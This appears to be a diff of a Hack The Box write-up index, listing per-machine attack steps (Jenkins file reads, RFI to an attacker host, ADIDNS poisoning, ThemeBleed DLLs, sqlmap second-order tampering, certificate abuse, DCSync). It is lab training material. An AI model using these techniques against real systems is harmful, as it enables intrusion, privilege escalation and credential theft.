 - Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
 - Enumerate SNMP with common/default community strings and walk users, processes, installed software, listening ports, and command-line arguments—not only system metadata.
 - Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
-- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 
 ### Post-foothold local enumeration and lateral movement
 
@@ -3486,7 +3495,6 @@ Open the PDF around page **9** and search for the technologies, functions, filen
 - Run sudo getprofile.sh, extract profile.zip, recover the copied root private key, fix permissions, and SSH as root.
 - Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
 - Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
-- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 
 ### Root / Administrator path
 
@@ -3528,6 +3536,7 @@ Builder is a medium-difficulty Linux machine that features a Jenkins instance. T
 - Use the Jenkins CLI exploit to read /var/jenkins_home/users/users.xml and the per-user config.xml rather than guessing Linux home paths.
 - Recover jennifer's Jenkins password hash from the user config and crack it offline.
 - Authenticate to Jenkins and inspect jobs/workspaces/credentials for the encrypted root SSH private key.
+- Jenkins CLI help @file leaks only the first lines; switch to connect-node @/var/jenkins_home/users/users.xml and connect-node @.../config.xml to recover complete multiline XML, the user directory, and password hash.
 - Inspect application/service environment variables and readable process environments for secrets, connection strings, internal endpoints, and runtime paths.
 - After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
 - Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
@@ -3563,8 +3572,8 @@ Open the PDF around page **3** and search for the technologies, functions, filen
 ### Privilege-escalation checks
 
 - Preferred path: decrypt/convert the recovered root SSH key, chmod 600, and SSH directly as root.
-- Alternate path documented by the writeup: if the Jenkins Agent plugin is available, define an agent whose launch command executes under the Jenkins/root service context.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
+- Document the first writeup method accurately: use the installed SSH Agent plugin in a Jenkins Pipeline with sshagent(credentials: ['1']) to SSH as root and read /root/.ssh/id_rsa.
+- Document the second method accurately: use the authenticated Jenkins /script console and hudson.util.Secret.decrypt(<encrypted credential>) to decrypt the stored root SSH key, then use that key for root SSH.
 
 ### Root / Administrator path
 
@@ -3600,7 +3609,6 @@ Browsed is a medium-difficulty Linux machine centred around abusing browser exte
 - Upload an extension that exfiltrates the developer browser's current URL/DOM activity to an attacker-controlled listener.
 - The developer's browser reveals browsedinternals.htb; add it to /etc/hosts and access the internal Gitea instance.
 - Read the Flask repository/source and routines.sh; identify the command injection exposed only through a localhost endpoint.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
@@ -3640,6 +3648,7 @@ Open the PDF around page **4** and search for the technologies, functions, filen
 - Enumerate writable application paths and notice a root-owned Python program imports a module whose __pycache__ directory is group writable.
 - Compile/replace the expected version-tagged .pyc file (for example the module's cpython-312.pyc), preserving the filename/import expectations.
 - Wait for or trigger the trusted root process to import the poisoned bytecode and execute the payload as root.
+- Merely compiling/copying a malicious .pyc is insufficient: run the sudo tool once to create the legitimate extension_utils.cpython-312.pyc, copy its first 16-byte header onto the malicious bytecode, delete/replace the original cache file, then invoke the sudo tool again.
 - Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
 - Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
 
@@ -3677,10 +3686,11 @@ StreamIO is a medium machine that covers subdomain enumeration leading to an SQL
 - Manually exploit MSSQL UNION injection on watch.streamio.htb/search.php when sqlmap fails; enumerate tables and extract/crack application credentials.
 - Use cracked credentials to enter the hidden/admin panel, then test its page parameter for LFI with PHP wrappers to read source.
 - Source review exposes an include/RFI path; host a PHP payload and have the target include it to obtain the first shell.
+- Fuzz authenticated admin query parameters to find debug; read source with /admin/?debug=php://filter/convert.base64-encode/resource=index.php and repeat for master.php.
+- Trigger RFI/RCE with a POST to /admin/?debug=master.php and an include=http://<attacker>/test.php parameter; master.php must be included through index.php because direct access is blocked.
 - Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
 - Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
 - Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
 - Check who can read LAPS attributes and query the correct computer object. The password is host-specific; use it with the local Administrator context, not automatically as a domain credential.
 - Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
@@ -3728,11 +3738,9 @@ Open the PDF around page **1** and search for the technologies, functions, filen
 - After joining Core Staff, query LDAP for the LAPS attribute/password on the target computer object.
 - Use the host-specific LAPS Administrator password for the final privileged connection.
 - Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
-- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 - Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
 - Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
 - Check who can read LAPS attributes and query the correct computer object. The password is host-specific; use it with the local Administrator context, not automatically as a domain credential.
-- Search SYSVOL/NETLOGON for Group Policy Preference XML files and decrypt any `cpassword`; then test the recovered credential on SMB/WinRM and for Kerberoasting.
 
 ### Root / Administrator path
 
@@ -3783,6 +3791,7 @@ Intelligence is a medium difficulty Windows machine that showcases a number of c
 - Use ADIDNS permissions to add a malicious A record/hostname that resolves to the attacker, then run Responder/HTTP capture before the scheduled check.
 - Crack the captured second user's NetNTLM hash and re-enumerate AD rights with that identity.
 - Read the gMSA managed password allowed to the second user and derive the gMSA NT hash.
+- The scheduled downdetector.ps1 runs every five minutes and only requests DNS records whose names start with web; create an ADIDNS record such as web1 pointing to the attacker before starting Responder.
 
 ### User path
 
@@ -3844,7 +3853,6 @@ Jeeves is not overly complicated, however it focuses on some interesting techniq
 - Directory fuzz the Jetty service and discover the unlinked /askjeeves/ path; do not assume Jenkins must appear at the root.
 - Create a Jenkins job with an Execute Windows batch command build step for command execution.
 - Windows Defender blocks common Metasploit payloads here; transfer a standalone Windows netcat and use the Jenkins job to launch the callback as kohsuke.
-- For KeePass artifacts, collect the database, dump/config/key material, and test the relevant recovery vulnerability; convert any recovered PuTTY/SSH key into a usable OpenSSH key.
 
 ### Post-foothold local enumeration and lateral movement
 
@@ -3877,7 +3885,6 @@ Open the PDF around page **2** and search for the technologies, functions, filen
 - Use pass-the-hash (the writeup uses pth-winexe) with the KeePass Administrator NTLM hash to obtain an Administrator shell.
 - Administrator access is not the end: the root flag is hidden in an NTFS alternate data stream on hm.txt.
 - Run dir /R to enumerate streams, then read hm.txt:root.txt with PowerShell Get-Content -Stream root.txt.
-- For KeePass artifacts, collect the database, dump/config/key material, and test the relevant recovery vulnerability; convert any recovered PuTTY/SSH key into a usable OpenSSH key.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 
 ### Root / Administrator path
@@ -3924,7 +3931,6 @@ Manager is a medium difficulty Windows machine which hosts an Active Directory e
 - Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
 - Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
 - Perform RID/SID cycling with `impacket-lookupsid`; save only `SidTypeUser` names for spraying. Try null, guest, and any low-privilege credential because each may expose different ranges.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.
 - Abuse MSSQL `xp_dirtree` for filesystem discovery or forced SMB authentication. Check web roots, backups, configuration files, and UNC paths; it often works without `xp_cmdshell`.
 - Inspect IIS bindings and configuration (`applicationHost.config`, site-level `web.config`, app pools, physical paths, connection strings, and internal host headers). A second binding/application can expose a hidden site or stronger execution identity.
@@ -3971,7 +3977,6 @@ Open the PDF around page **5** and search for the technologies, functions, filen
 - If cleanup removes officer rights, repeat the add-officer step before issuing.
 - Synchronize time when PKINIT returns KRB_AP_ERR_SKEW, authenticate with administrator.pfx to recover the NT hash, and use it over WinRM.
 - Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.
-- Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
 
 ### Root / Administrator path
 
@@ -4011,6 +4016,7 @@ Aero is a medium-difficulty Windows machine featuring two recent CVEs: CVE-2023-
 - Match the theme-upload workflow to ThemeBleed/CVE-2023-38146 and build the malicious .theme plus DLL with the x64 proof of concept.
 - The ThemeBleed server needs TCP 445 on the attacker Windows host; stop/disable the local Server service and reboot if it already owns that port.
 - Replace the proof-of-concept DLL action with a reverse-shell payload and run the ThemeBleed server and listener simultaneously before uploading the theme.
+- The ThemeBleed payload DLL must export VerifyThemeVersion, be compiled in Release x64, then be renamed exactly stage_3 and copied into the ThemeBleed data directory; merely building a generic reverse-shell DLL will not make the PoC load it.
 
 ### Post-foothold local enumeration and lateral movement
 
@@ -4124,6 +4130,7 @@ Open the PDF around page **4** and search for the technologies, functions, filen
 - Emily has GenericWrite over Ethan; set a controlled SPN on Ethan and perform targeted Kerberoasting rather than a domain-wide roast only.
 - Crack Ethan's service ticket and authenticate as Ethan, then verify his directory-replication rights.
 - Use Ethan's DCSync rights with secretsdump to retrieve the Administrator NT hash and use pass-the-hash for the final administrative shell.
+- If targetedKerberoast returns KRB_AP_ERR_SKEW while targeting Ethan, synchronize the attacker clock with the DC (the writeup uses ntpdate against 10.10.11.42) and rerun it; otherwise the GenericWrite/SPN path appears broken.
 - Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
 - Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
 - With any valid domain credential or ticket, request SPN service tickets (`GetUserSPNs`) and crack them; do not assume the SPN account is obviously privileged.
@@ -4200,7 +4207,7 @@ Open the PDF around page **3** and search for the technologies, functions, filen
 
 - Confirm AD CS with nxc ldap -M adcs, then run certipy find -vulnerable as ca_operator; the CertifiedAuthentication template is vulnerable to ESC9.
 - Use management_svc's control to change ca_operator's UPN to Administrator, then request a certificate through the vulnerable template as ca_operator.
-- Authenticate with the resulting PFX to recover Administrator's NT hash; restore modified account attributes where practical after obtaining the certificate.
+- After issuing `administrator.pfx`, restore ca_operator's UPN to `ca_operator@certified.htb` before running `certipy auth -pfx administrator.pfx`; this ordering is required for the working ESC9 sequence, not optional cleanup.
 - Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.
 
 ### Root / Administrator path
@@ -4240,7 +4247,6 @@ Mailing is an easy Windows machine that runs hMailServer and hosts a website vul
 - Use CVE-2024-21413/Moniker Link: send mail from administrator@mailing.htb to the likely Maya mailbox with a UNC link to the attacker SMB listener.
 - Capture and crack Maya's NetNTLM hash, then test the plaintext password over WinRM.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 
 ### Post-foothold local enumeration and lateral movement
 
@@ -4313,9 +4319,10 @@ Intentions is a hard Linux machine that starts off with an image gallery website
 - Treat the gallery filtering workflow as second-order SQL injection: input is stored first and becomes injectable when a later operation consumes it.
 - Extract BCrypt hashes, then enumerate the v2 API because it accepts a hash as an authentication secret; use that behavior to reach the admin panel without cracking first.
 - The admin image editor invokes ImageMagick; exploit object instantiation/format handling to write or execute a PHP payload in web-accessible storage.
+- A basic sqlmap run against updateGenresRequest and even an initial --second-req run return no injection because the application strips spaces. Save the update-genres request and feed request separately, use --second-req=fetchFeedRequest with --tamper=space2comment, and if only time-based behavior appears add --dbms=MySQL --level=5.
+- The Imagick foothold requires a multipart MSL upload with path=vid:msl:/tmp/php*, an arbitrary required effect value, and file=@payload.msl so Imagick processes the unknown PHP temporary filename and writes rce.php into public storage. A 502 or empty response can still be success, so verify /storage/rce.php rather than abandoning the exploit.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
 - Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 - Inspect application/service environment variables and readable process environments for secrets, connection strings, internal endpoints, and runtime paths.
@@ -4457,7 +4464,6 @@ Open the PDF around page **7** and search for the technologies, functions, filen
 - Run Rubeus tgtdeleg in the app-pool context to obtain the machine-account ticket, then convert the kirbi/Base64 ticket to ccache.
 - Use the machine ticket for DCSync and retrieve the Administrator hash.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
 - Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.
 - Confirm `SeImpersonatePrivilege`, OS build, and available coercion path before selecting a Potato/PrintSpoofer-style token impersonation technique.
@@ -4558,6 +4564,7 @@ Open the PDF around page **4** and search for the technologies, functions, filen
 - Create an authenticated attacker SMB share, map it from the target, and use wbadmin to back up the NTDS volume to that share.
 - Restore/extract NTDS.dit plus the SYSTEM hive from the backup and run secretsdump offline.
 - Pass the recovered Administrator NT hash for the final shell.
+- Use wmiexec with the recovered Administrator NT hash for the final shell: psexec changes the context to NT AUTHORITY\SYSTEM, which cannot decrypt the Administrator's EFS-protected root.txt even though the hash recovery itself succeeded.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - With SeBackup, use backup semantics (for example DiskShadow/robocopy or BackupOperator tooling) to copy SAM/SYSTEM or NTDS/SYSTEM, then extract hashes offline.
 - Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.
@@ -4606,7 +4613,6 @@ EscapeTwo is an easy difficulty Windows machine designed around a complete domai
 - Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
 - Check whether MSSQL `xp_cmdshell` is enabled or can be enabled by the current role; distinguish database-level access from OS command execution.
 - Search SYSVOL/NETLOGON for Group Policy Preference XML files and decrypt any `cpassword`; then test the recovered credential on SMB/WinRM and for Kerberoasting.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.
 - Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
@@ -4702,7 +4708,6 @@ Mentor is a medium difficulty Linux machine whose path includes pivoting through
 - The backup endpoint has blind command injection; verify with an out-of-band callback before sending the reverse shell.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Enumerate SNMP with common/default community strings and walk users, processes, installed software, listening ports, and command-line arguments—not only system metadata.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
@@ -4785,13 +4790,14 @@ Open the PDF around page **19** and search for `Privilege Escalation` plus the s
 
 ### Machine path overview
 
-Outdated is a Medium Difficulty Linux machine that features a foothold based on the Follina CVE of 2022. The box further encompasses an Active Directory scenario, where we must pivot from domain user to domain controller, using an array of tools to leverage the AD 's configuration and adjacent edges to our advantage. The final step includes taking advantage of Windows Server Update ServicesWSUS and using its poor configuration to compromise the domain controller.
+Outdated is a Medium Difficulty Windows Active Directory machine that features a foothold based on the Follina CVE of 2022. The box further encompasses an Active Directory scenario, where we must pivot from domain user to domain controller, using an array of tools to leverage the AD 's configuration and adjacent edges to our advantage. The final step includes taking advantage of Windows Server Update ServicesWSUS and using its poor configuration to compromise the domain controller.
 
 ### Remote enumeration and foothold checks
 
 - Notice WSUS ports 8530/8531 and hostnames mail.outdated.htb and dc.outdated.htb during the first scan; preserve them for later.
 - Try SMB null access: Shares is readable and contains the document that discloses the IT support mailbox and Follina/CVE-2022-30190 context.
 - Generate the Follina document and deliver it to itsupport through the mail service (retry if necessary); host the MSDT payload and listener at the same time.
+- Outdated is a Windows Active Directory target; Follina, WinRM, Shadow Credentials, and WSUS are Windows-domain steps despite the official synopsis's accidental 'Linux machine' wording.
 - Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
@@ -4872,6 +4878,7 @@ Atom is a Medium Windows machine that features a hosting of Electron software. T
 - Read UAT_Testing_Procedures.pdf: QA automatically tests files placed in client update folders.
 - Capture the Electron application's update request to learn that it fetches latest.yml from updates.atom.htb.
 - Exploit electron-builder update signature handling: build a higher-version latest.yml with the correct SHA-512/Base64 metadata and place it with the reverse-shell executable in Software_Updates.
+- The electron-builder signature bypass depends on placing a single quote in the payload filename (for example s'hell.exe) and using that exact quoted name in both the url and path fields of latest.yml; the higher version and SHA-512 metadata alone do not bypass validation.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - Test SMB/RPC as `guest` with no password as a separate case from a blank null session. Use it for share listing and SID/RID enumeration even if file access is limited.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
@@ -4959,7 +4966,7 @@ Authority is a medium-difficulty Windows machine that highlights the dangers of 
 
 ### User path
 
-**Memory chain:** LDAP enumeration → WinRM → SMB enumeration → AD CS/certificate abuse → password cracking → credential reuse → reverse shell
+**Memory chain:** anonymous Development SMB share → Ansible Vault cracking → PWM LDAP-profile credential capture → svc_ldap
 
 - Browsing to port 8443 using https:// , we are redirected to /pwm/private/login , which appears to be an instance of an open-source password self-service application that can be use with LDAP in Active Directory environments.
 - When visiting the site, we get a popup showing that the application is in Configuration Mode , so it seems we need to get into the Configuration Manager or Configuration Editor , which both just take a password; no username needed.
@@ -4989,18 +4996,18 @@ Open the PDF around page **8** and search for the technologies, functions, filen
 
 - Use the default MAQ to add an attacker-controlled computer account over LDAPS.
 - Enroll in CorpVPN as that machine while supplying Administrator as the SAN/UPN.
-- Use the certificate with pass-the-cert/LDAP to grant the controlled principal DCSync rights or otherwise retrieve domain secrets, then DCSync Administrator.
+- certipy auth with administrator_authority.pfx fails with KDC_ERR_PADATA_TYPE_NOSUPP because this DC does not support PKINIT. Extract administrator.crt and administrator.key from the PFX with OpenSSL, then use PassTheCert over LDAPS/Schannel instead of repeatedly troubleshooting Kerberos.
+- Use PassTheCert with `-action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'EVIL01$'`; then request `cifs/AUTHORITY.authority.htb` while impersonating Administrator, export the ccache, and run `secretsdump -k`. Do not try to grant direct DCSync rights with the certificate.
 - Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.
 - Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 - For RBCD, obtain/control a machine account, write `msDS-AllowedToActOnBehalfOfOtherIdentity`, request an impersonation service ticket, and use the ticket against the correct SPN.
-- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.
 
 ### Root / Administrator path
 
-**Memory chain:** AD CS/certificate abuse → registry secrets → BloodHound path analysis → private-key discovery → subdomain enumeration → group-membership abuse → SMB enumeration → LDAP enumeration → PFX/certificate-key recovery → pass-the-hash
+**Memory chain:** MachineAccountQuota computer account → ESC1 CorpVPN certificate as Administrator → PKINIT unsupported → PassTheCert RBCD to AUTHORITY$ → impersonate Administrator for CIFS → Kerberos secretsdump
 
 - This means that we can request a certificate on behalf of another user, such as a Domain Admin.
 - To use this tool, we first must extract the .crt and .key files from the .pfx certificate file using OpenSSL.
@@ -5044,7 +5051,6 @@ Clicker is a Medium Linux box featuring a Web Application hosting a clicking gam
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
 - Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
 - Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
 
@@ -5122,6 +5128,8 @@ Cerberus is a Hard Difficulty Windows machine that initially presents a scant ra
 - Use Icinga Web's pre-auth file-read issue to inspect documented configuration paths and recover Matthew's database/application credential.
 - After authenticating as an Icinga administrator, exploit the SSH-resource certificate handling bug by embedding PHP around a valid PEM certificate and reach the written payload for RCE.
 - Recognize the first shell as a Linux container; do not assume the Windows target has been reached.
+- Use the pre-auth Icinga traversal endpoint /icingaweb2/lib/icinga/icinga-php-thirdparty{file} to read /etc/icingaweb2/authentication.ini and /etc/icingaweb2/resources.ini; resources.ini contains Matthew's database/application credential.
+- For Icinga RCE, ssh-keygen output is rejected: generate a valid RSA private key with openssl genrsa, prepend PHP, set the SSH Identity resource User field to ../../../../../dev/shm/training/configuration.php, change the Icinga Module Path to /dev/shm, and visit the training module. The disclosure's OpenSSL NULL-byte route fails on this target because that library behavior is patched.
 - Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
@@ -5138,7 +5146,7 @@ Cerberus is a Hard Difficulty Windows machine that initially presents a scant ra
 
 ### User path
 
-**Memory chain:** group-membership abuse → virtual-host enumeration → SQL injection → LFI/local file read → configuration-file secrets → SSH → private-key discovery → path traversal → reverse shell → SUID abuse
+**Memory chain:** Icinga pre-auth traversal → resources.ini Matthew credential → Icinga module-path PHP RCE → Linux container shell → Firejail CVE-2022-31214 → SSSD Matthew hash → tunneled WinRM
 
 - Typically, it would be assumed that using ssh-keygen to get a key would work, but in this case, Icinga expects an RSA private key generated with OpenSSL .
 - So let's create a key and submit it to Icinga and then use the LFI to verify it. openssl genrsa -out private-key.pem 1024 We can see that we are indeed successful in getting arbitrary file writes on the target.
@@ -5162,17 +5170,16 @@ Open the PDF around page **5** and search for the technologies, functions, filen
 ### Privilege-escalation checks
 
 - CVE-2022-47966 requires ADSelfService SAML parameters; inspect C:\Program Files (x86)\ManageEngine\ADSelfService Plus\backup for the offline .ezip backup.
-- The backup password is the reversed backup filename; extract it and grep for issuer_url and the SAML GUID.
-- Configure the exploit/module with the recovered GUID, issuer URL, HTTP scheme, internal hostname, and SOCKS proxy to obtain SYSTEM.
+- Derive the backup password by reversing only the backup basename without `.ezip` (for example, reverse `OfflineBackup_20230214064809`).
+- Obtain the assertion GUID by decoding the ADSelfService redirect's `SAMLRequest`; obtain `issuer_url` separately from the extracted offline backup, then configure the exploit with both values.
 - After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.
 
 ### Root / Administrator path
 
-**Memory chain:** WinRM → default credentials
+**Memory chain:** ADSelfService Plus 9251 tunnel → decode redirect SAMLRequest GUID → offline backup issuer_url → CVE-2022-47966 → SYSTEM shell
 
 - This shows some information about the SAML assertion as well as the GUID of the assertion. pVNdj9MwEHznV1h+bz5MLk2tJqfScqJSD6I2xwMvyHE2PUuOXWynd/fvcfpxFARFAilKJHt2d3ZmMr197iTag7F CqxzHQYQRKK4bobY5fqjuRhm+Ld5MLesk2dFZ7x7VGr71YB2aWQvG+bq5VrbvwGzA7AWHh/Uqx4/O7SwNw8WcTs hNHA4NVnorVJiOWdbEUZxOoiQiDU9ZOk6SOmt5xsacxYy3WVaTFqOFnyIUcwdq54YNDziYGkxvA6k5kyFrWhtKG 2K0XOT4K/Dspm14ndUJSzOScR5l2SQZx8S/Gk48zNoelso6plyOSUTejiL/TKo4ocmEEhKk4+gLRqXRTnMt3wl1 1KM3impmhaWKdWCp43Qzu19REkS0PoIs/VBV5aj8tKkODfaiAfPRo3N8zxTbwnvlRQA0W2xAtifFUCl7i9Hnsw1 ksMEboyw9Cn999O7EExdHn+hhQYPutOmYu147nIhm1B6gFJQT7uWn2dfL2TkDuPh/x6fhJf3iHLpBveWi1FLwFz STUj/NDTDnFXWmB/zXNeMg/mXNXtkdcNEKaHD4OueUa2gOKfehdvDs0Fx3O2aEHXyBZ8bdq8qXsLn0Sqyh/Sflr sI45UNvf1z6z5M2zRBL4J5nZZhfRBt3Fu53jIrT5R/2+3F9+W8X3wE= GUID: 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f If we Google adselfservice plus saml exploit we are lead to a Rapid7 writeup that includes a Metasploit module.
 - download this module and save it to /usr/share/metasploitframework/modules/exploits/windows/http/ .
@@ -5193,7 +5200,7 @@ Open the PDF around page **17** and search for `Privilege Escalation` plus the s
 
 ## 63- Cereal
 
-**Target:** Linux · Hard
+**Target:** Windows / IIS / .NET · Hard
 
 [Detailed notes](./htb-writeups/Cereal.md) · [Official PDF](./htb-writeups/Cereal.pdf)
 
@@ -5209,12 +5216,14 @@ Cereal is a hard difficulty Windows machine with a repository exposing source co
 - Review RequestsController and the model binder: deserialization is localhost-only and filters ObjectDataProvider strings, so a direct remote payload is insufficient.
 - Review AdminPage.jsx/package.json: stored Markdown is rendered by vulnerable react-marked-markdown, enabling XSS against the admin and a localhost request to the deserialization endpoint.
 - Use the XSS to send the serialized payload internally and download/write the web shell.
